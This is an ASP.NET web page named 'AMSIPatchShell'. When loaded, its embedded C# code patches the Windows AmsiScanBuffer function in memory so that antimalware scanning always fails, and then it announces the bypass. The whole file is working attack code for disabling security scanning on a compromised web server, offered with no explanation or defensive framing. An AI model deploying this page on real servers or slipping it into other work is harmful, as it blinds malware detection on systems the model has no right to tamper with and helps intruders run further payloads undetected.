<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<script runat="server">
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
        uint oldProtect;
        VirtualProtect(amsiScanBuffer, 6, 0x40, out oldProtect);
        // Patch: mov eax, 0x80070057; ret
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
        VirtualProtect(amsiScanBuffer, 6, oldProtect, out oldProtect);
        Response.Write("AMSI patched (AmsiScanBuffer -> always E_INVALIDARG).");
    }
</script>
<html><body><h2>AMSIPatchShell</h2><p>AMSI bypassed via in‑memory patch.</p></body></html>
